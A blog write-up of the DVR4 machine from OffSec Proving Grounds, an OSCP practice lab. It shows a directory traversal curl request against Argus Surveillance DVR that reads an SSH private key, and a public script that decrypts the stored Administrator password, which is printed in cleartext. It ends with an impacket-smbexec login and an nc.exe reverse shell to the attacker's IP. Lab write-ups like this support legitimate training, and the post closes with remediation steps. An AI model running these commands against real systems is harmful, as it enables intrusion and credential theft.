---
layout: writeup
title: DVR4 - Proving Grounds
date: 2024-08-08 13:32:20 +0300
description: A Writeup of the DVR4 Box from Proving Grounds
image: # /assets/images/DVR4/DVR4.png
fig-caption: # Add figcaption (optional)
tags: [Windows, TJ Null, LainKusanagi]
---

This is a writeup for a [Proving Grounds](https://www.offsec.com/labs/) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)as well as LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called DVR4, and it is rated Intermediate by Proving Grounds and Hard by the community. As usual, we get started with an nmap scan: 
```
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```


First few ports we notice are 139, 445, and 8080. I tried to get some more information using `rpcclient` and connecting to SMB, but neither worked, so I headed to the browser to check port 8080 and find this:

![DVR1.png](/assets/images/DVR4/DVR1.png){: .responsive-image}

It looks like we have a management portal for a service called `Argus Surveillance`. I click around for a bit to check it out and then search for existing exploits. I notice a few of them, including a [directory traversal exploit on exploit-db]() as well as a [weak encryption exploit on github](https://github.com/s3l33/CVE-2022-25012). The github exploit is interesting because it references the full path of a file which holds the password hash as `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`. It's possible we could combine the two, using the directory traversal exploit to retrieve the hash and the exploit on github to crack it. 

I can get the the directory traversal working using the suggested path: `curl "http://192.168.171.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="`. Unfortunately the hash is not shown in the output. 

![DVR2.png](/assets/images/DVR4/DVR2.png){: .responsive-image}

I even tried to create my own user just to see if it showed up, but no luck. 

![DVR3.png](/assets/images/DVR4/DVR3.png){: .responsive-image}

\At least now I know the directory traversal works. The key is just going to be finding something interesting to open. I try a few different things from this [Directory Traversal Cheat Sheet](https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9), but I can't find anything, initially believing that I didn't have a user. But I can actually check `Viewer` per the screenshot above. It may just be an account type, but it could be a user too. Using the path of `Users/Viewer/.ssh/id_rsa`, we can grab the ssh key.

![DVR4.png](/assets/images/DVR4/DVR4.png){: .responsive-image}

I copy this key to my machine, and I am able to log in with it via ssh `ssh -i viewer.id_rsa viewer@$IP`. I log in, look around for a while, and run winpeas. I don't see anything especially interesting, nor do I have any privileges that stand out. I decide to check out `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini` from my ssh shell because the output I received from the directory traversal vulnerability didn't look like what was shown in the exploit POC from exploit-db. That turned out to be pretty useful:

```
...
[Users]
LocalUsersCount=2
UserID0=434499
LoginName0=Administrator
FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
...
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
...
```

So we can see the password hash here, and there is an existing exploit on github around the weak encryption. We simply `git clone` the [repository](https://github.com/s3l33/CVE-2022-25012), cd into it, and then run `python3 CVE-2022-25012.py $Hash`. 

![DVR5.png](/assets/images/DVR4/DVR5.png){: .responsive-image}

Because that hash corresponds to the Administrator account, we now have `Administrator:14WatchD0g$` credentials. (Out of curiosity, I checked for the viewer account, and we have `viewer:ImWatchingY0u` as well). Perfect. Now we can try SSHing with Administrator, or any number of other escalations. 

It turns out SSH didn't work, but I was able to run `impacket-smbexec Administrator:"14WatchD0g$"@192.168.224.179`, after putting the password in quotes because it didn't work without. 

![DVR6.png](/assets/images/DVR4/DVR6.png){: .responsive-image}

Now this shell is only semi-interactive. I *can* use it for proof.txt, but in case it feels like cheating, I can also just call a shell with it: `C:\Users\viewer\nc.exe 192.168.45.240 445 -e cmd`. Note that this works because nc.exe is on the machine already, and I saw it when initially enumerating with the viewer user after SSHing in. That is why the full path points to their directory. You could always upload it yourself, though there are obviously a ton of ways to do this once you have the password. 

![DVR7.png](/assets/images/DVR4/DVR7.png){: .responsive-image}

### Lessons Learned
This was a relatively straightforward box. As long as you look up the Argus service and the popular exploits, know where the ssh key could be, go back to check the suggested file from the exploits, and then know how to use the Administrator password (without ssh available), it should be pretty good. 

### Remediation Steps 
1. The service needs to be updated or changed because:
	1. It has the directory traversal vulnerability
	2. It has weak encryption. Simply making the passwords more complex is not enough. 
2. The account running the Argus service shouldn't also be able to SSH into the machine if possible. Maybe this one isn't such a big deal because once you eliminate the directory traversal vulnerability, there isn't the same relationship between the Argus service and SSHing. If you can't access the SSH key through the service, then it doesn't really make a difference which account can use SSH, whether it's the same account running Argus or not. 